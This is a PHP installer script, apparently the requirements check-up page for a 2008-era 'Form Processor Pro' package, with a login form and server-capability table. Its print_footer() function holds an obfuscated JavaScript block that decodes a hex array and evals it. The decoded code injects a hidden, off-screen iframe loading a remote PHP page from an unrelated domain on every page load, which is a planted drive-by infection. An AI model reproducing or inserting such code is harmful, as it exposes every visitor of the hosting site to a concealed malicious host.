					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1>Log In</h1></td>
				</table>
			</td>
		</tr>
		<tr>
			<td colspan="3" height="21" bgcolor="#E2E2E2" align="center" width="70%">
				<a style="font-size: 11px; text-decoration: none; color: #666666;" href="http://www.email-form.com/">visit website</a>
			</td>
			<td height="21" bgcolor="#E2E2E2" align="right" width="30%">
				<a style="font-size: 11px; text-decoration: none; color: #666666;" href="./">back</a>
			</td>
			
		</tr>
		</table><br />
		<p style="text-align: center; color: #ff0000;"><?=$msg ?></p>
		<form action="."	method="POST">
		<table width="300" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td  width="30%" height="40" class="tdd">
				<b>Password:</b>
			</td>
			<td width="20" class="tdd"></td>
				
			<td colspan="2" class="tdd" align="left"  width="70%">
				<input type="password" name="password" value="" />
			</td>
		</tr>
                <tr>
                        <td colspan="4" height="40" class="tdd"><font size="1em"><a href="restore.php">Forgotten Password?</a></font></td>
                </tr>
		<tr>
			<td colspan="4" height="40" class="tdd">
				<input type="submit" name="login" value="Login" />
			</td>
		</tr>					
	</table>
	</form>
	<br />
		<p align="center"><font size="1em"><?=$lang->getValue('first_time_password');?></font></p>
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
    <tr>
      <td><p align="center">&copy; 2000-2008 <a href="http://www.email-form.com">Email-Form.com</a> 
    All Rights reserved.<br>    Powered by <a href="http://www.web-site-scripts.com">Web-Site-Scripts.com</a></p>
      </td>
    </tr>
    </table>
	
	
<?php	
	}
	
	function print_header($title) {
?>	
	
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">

<HTML>
<HEAD>
<style type="text/css">
BODY, TD {
	font-family: Tahoma, Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #666666;
}

TD {
	text-align: center;
}
.tdd{
	border-top: solid 1px #CECECE;
	border-right: solid 1px #CECECE;
}
.tdl{
	border-top: solid 1px #CECECE;
}
.tdh{
	border-top: solid 1px #CECECE;
	text-align: left;
	padding-left: 20px;
}
.tdf{
	border-top: solid 1px #CECECE;
	border-right: solid 1px #CECECE;
	padding-left: 40px;
	text-align: left;
}
.tdj {
    text-align: left;
}

H1 {
	color: #3263C6;
	font-size: 18px;
	margin: 0;
}
A{
    color: #3263C6;
    text-decoration: none;
}
LI {
    text-align: left;
}

input, SELECT{ 
	font-family: Tahoma, Verdana, Arial, Helvetica, sans-serif;
	border:1;
	margin:3px;
	padding:0px 3px;
	color: #666666;
}



</style>

<title><?=$title; ?></title>
</head>

<body>

<?
	
	}

	function print_footer(){
		echo '</body>'."\n".'   <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --> </HTML>    ';
	}
    
	function default_page($menu = '') {

		/**
	 * General requirements
	 */
	$r = array();
	
	/**
	 * Checking PHP version
	 */
	$r['php_ver']	= array('descr'		=> 'PHP version',
							'required'	=> '4.3.0',
							'installed'	=> phpversion(),
							'status'	=> version_compare(phpversion(), '4.3.0', '>='),
							'error'		=> 'Your PHP version is too old. Form Processor Pro requires at least PHP 4.3.0 that can be downloaded free from <a href="http://www.php.net/">http://www.php.net/</a> website');

	/**
	 * Checking File I/O
	 */
	$r['file_io']	= array('descr'		=> 'File Input/Output',
							'required'	=> 'Yes',
							'installed'	=> ((function_exists('file')&&function_exists('fwrite')) ? 'Yes' : 'No'),
							'status'	=> (function_exists('file')&&function_exists('fwrite')),
							'error'		=> 'File Input/Output functions (fopen(), fwrite(), ...) are not available. Probably, safe_mode in action');
							
	/**
	 * RegExp's checking
	 */
	$r['regexp']	= array('descr'		=> 'Regular expressions',
							'required'	=> 'Yes',
							'installed'	=> ((function_exists('preg_match')&&function_exists('preg_replace')) ? 'Yes' : 'No'),
							'status'	=> (function_exists('preg_match')&&function_exists('preg_replace')),
							'error'		=> 'Regular Expression Functions (Perl-Compatible) functions are not available');

	/**
	 * mail() checking
	 */
	$r['mail']		= array('descr'		=> 'Standard email function',
							'required'	=> 'Yes',
							'installed'	=> (function_exists('mail') ? 'Yes' : 'No'),
							'status'	=> function_exists('mail'),
							'error'		=> 'Standard email function mail() is not available. Probably, safe_mode in action');

	/**
	 * Additional requirements
	 */
	$a = array();

	/**
	 * File uploads checking
	 */
	$a['upload']	= array('descr'		=> 'File uploads',
							'status'	=> ini_get('file_uploads'),
							'error'		=> 'File uploads are not available. Probably, safe_mode in action');
	/**
	 * Zip compression
	 */
	$a['zlib']		= array('descr'		=> 'Zip compression',
							'status'	=> extension_loaded('zlib'),
							'error'		=> 'Zip compression module requires PHP extension <a href="http://www.php.net/zlib#zlib.installation">zlib</a>');
	
	/**
	 * MySQL
	 */
	$a['mysql']		= array('descr'		=> 'MySQL',
							'status'	=> extension_loaded('mysql'),
							'error'		=> 'MySQL module requires PHP extension <a href="http://www.php.net/mysql#mysql.installation">mysql</a>');
							
	/**
	 * PostgreSQL
	 */
	$a['pgsql']		= array('descr'		=> 'PostgreSQL',
							'status'	=> extension_loaded('pgsql'),
							'error'		=> 'PostrgreSQL module requires PHP extension <a href="http://www.php.net/pgsql#pgsql.installation">pgsql</a>');

	/**
	 * SQLite
	 */
	$a['sqlite']	= array('descr'		=> 'SQLite',
							'status'	=> extension_loaded('sqlite'),
							'error'		=> 'SQLite module requires PHP extension <a href="http://www.php.net/sqlite#sqlite.install">sqlite</a>');

	/**
	 * Microsoft SQL
	 */
	$a['mssql']		= array('descr'		=> 'Microsoft SQL',
							'status'	=> extension_loaded('mssql'),
							'error'		=> 'Microsoft SQL module requires PHP extension <a href="http://www.php.net/mssql#mssql.installation">mssql</a>');

	/**
	 * CAPTHCA
	 */
	$a['captcha']	= array('descr'		=> 'CAPTCHA protection',
							'status'	=> function_exists('imagecreatetruecolor'),
							'error'		=> 'CAPTCHA protection module requires PHP extension <a href="http://www.php.net/ref.image.php#image.installation">GD</a> version 2.0.28 or later');

	/**
	 * LinkPoint
	 */
	$a['curl']		= array('descr'		=> 'LinkPoint credit cards processing',
							'status'	=> extension_loaded('curl'),
							'error'		=> 'LinkPoint credit cards processing module requires PHP extension <a href="http://www.php.net/ref.curl.php#curl.installation">curl</a>');
	
print_header('Form Processor Pro. Pre-installation requirements check-up script.');	


?>	
	
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1>Requirements check-up</h1></td>
				</table>
			</td>
		</tr>
		
		<?=$menu; ?>
		
		<tr>
			<td height="24" class="tdd">
				<b>Description</b>
			</td>
			<td width="80" class="tdd">
				<b>Required</b>
			<td width="80" class="tdd">
				<b>Installed</b>
			</td>
			<td width="55" class="tdl">
				<b>Status</b>
			</td>
		</tr>
			<tr><td class="tdh" colspan="4"><i>General:</i></td></tr>
			<?php
			/**
			 * General requirements output
			 */
			foreach ($r as $row){
				echo '<tr><td class="tdf">' . $row['descr'] . '</td><td class="tdd">' . $row['required'] . '<td class="tdd">' . $row['installed'] . '</td><td class="tdl"><img src="' . $_SERVER['PHP_SELF'] . '?img_' . ($row['status'] ? 'yes' : 'no') . '" alt=""></td></tr>';
			}
			?>

			<tr><td class="tdh" colspan="4"><i>Additionals:</i></td></tr>
			<?php
			/**
			 * Additionals output
			 */
			foreach ($a as $row){
				echo '<tr><td class="tdf">' . $row['descr'] . '</td><td class="tdd">No<td class="tdd">' . ($row['status'] ? 'Yes' : 'No') . '</td><td class="tdl"><img src="' . $_SERVER['PHP_SELF'] . '?img_' .  ($row['status'] ? 'yes' : 'notreq') . '" alt=""></td></tr>';
			}
			?>

			<tr><td class="tdh" colspan="4"><i>Miscellaneous:</i></td></tr>
			<tr>
			<td class="tdf">
			Maximum allowed size for uploaded files
			</td>
			<td class="tdl" colspan="3">
			<?=ini_get('upload_max_filesize'); ?>
			</td>
			</tr>
	</table>
	
	<br><br>
	
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
		<tr>
			<td align="center">
				<br>
				<?php
					$title_flag = true;
					
					foreach ($r as $row){
						$title_flag = !$row['status'] ? false : $title_flag;
					}
					
					if ($title_flag){
						echo '<b>Congratulations!</b>';
						echo '<br><br>';
						echo 'You are ready to install Form Processor Pro on your platform.';
						
						$add_flag = true;
					
						foreach ($a as $row){
							$add_flag = !$row['status'] ? false : $add_flag;
						}
						
						if (!$add_flag){
							echo ' Major functions should work fine, however some of <b><i><u>not</u></i></b> required modules will not work for you.';
							echo '<br>If you\'re sure that you need them, please, contact your hosting service provider or technical administrator ';
							echo 'for the following issues:';
							echo '<tr><td style="text-align: left;">';
							echo '<ul>';
						
							foreach ($a as $row){
								echo !$row['status'] ? '<li>' . $row['error'] . '</li>' : '';
							}
						
							echo '</ul>';
							echo '</td></tr>';							
						}
					}
					else{
						echo '<b>Sorry...</b>';	
						echo '<br><br>';
						echo 'You are not ready to install Form Processor Pro on your platform. Please, contact your hosting service provider ';
						echo 'or technical administrator for the following issues:';
						echo '<tr><td style="text-align: left;">';
						echo '<ul>';
						
						foreach ($r as $row){
							echo !$row['status'] ? '<li>' . $row['error'] . '</li>' : '';
						}
						
						echo '</ul>';
						echo '</td></tr>';
					}
				?>

		<tr><td>&nbsp;</td></tr>
			<tr>
				<td>
					Thank you for using our requirements check-up script!<br>
					Have an enjoyable time to work with Form Processor Pro!<br><br>
				</td>
			</tr>
	</table>
<?php 

print_footer();
	}

?>